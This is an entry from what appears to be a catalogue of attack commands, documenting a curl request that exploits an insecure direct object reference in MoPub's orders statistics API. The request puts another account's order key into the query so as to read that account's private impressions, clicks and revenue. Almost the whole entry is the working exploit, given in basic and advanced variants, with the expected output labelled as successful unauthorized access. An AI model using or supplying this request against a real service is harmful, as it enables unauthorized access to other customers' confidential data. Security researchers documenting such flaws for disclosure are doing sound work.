---
id: cmd-mopub-query-001
data: >-
  curl -X POST https://app.mopub.com/web-client/api/orders/stats/query -H
  "Content-Type: application/json" -H "x-csrftoken: {TOKEN}" -H "User-Agent:
  Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0"
  -H "Referer: https://app.mopub.com/orders" -b "csrftoken={TOKEN};
  sessionid={SID}; mp_mixpanel__c=1;" -d
  '{"startTime":"2019-04-07","endTime":"2019-04-20","orderKeys":["43b29d60a9724fa9abbdc800044002d6"]}'
tags:
  - api-query
  - idor
  - curl
  - mopub
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2024-10-01T12:00:00Z'
updated_at: '2025-12-14T17:25:48.015Z'
verified: false
validated: true
submitted: true
---
# mopub-orders-stats-query

## Command

```bash
curl -X POST https://app.mopub.com/web-client/api/orders/stats/query \
  -H "Content-Type: application/json" \
  -H "x-csrftoken: {TOKEN}" \
  -H "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0" \
  -H "Referer: https://app.mopub.com/orders" \
  -b "csrftoken={TOKEN}; sessionid={SID}; mp_mixpanel__c=1;" \
  -d '{"startTime":"2019-04-07","endTime":"2019-04-20","orderKeys":["43b29d60a9724fa9abbdc800044002d6"]}'
```

## Description

This curl command sends a POST request to MoPub's orders statistics endpoint, exploiting IDOR by including a non-owned orderKey in the orderKeys array. It requires an authenticated session and is used to query private data within a specified date range.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| startTime | Start date for statistics query (YYYY-MM-DD) | Yes |
| endTime | End date for statistics query (YYYY-MM-DD) | Yes |
| orderKeys | Array of UUID v4 order keys to query | Yes |
| x-csrftoken | CSRF token from session | Yes |
| sessionid | Session ID cookie | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://app.mopub.com/web-client/api/orders/stats/query -H "Content-Type: application/json" -b "sessionid=abc123" -d '{"orderKeys":["test-uuid"]}'
```

### Advanced Usage

```bash
curl -X POST https://app.mopub.com/web-client/api/orders/stats/query \
  -H "Content-Type: application/json" \
  -H "x-csrftoken: def456" \
  -b "sessionid=abc123" \
  -d '{"startTime":"2024-01-01","endTime":"2024-12-31","orderKeys":["43b29d60a9724fa9abbdc800044002d6", "another-uuid"]}'
```

## Expected Output

JSON object with order statistics, such as {"data": [{"orderKey": "uuid", "impressions": 1000, "clicks": 50, "revenue": 100.00}]} for successful unauthorized access.

## Related

- [[Related Procedure|procedures/Exploit-IDOR-in-Orders-Stats-Query]]
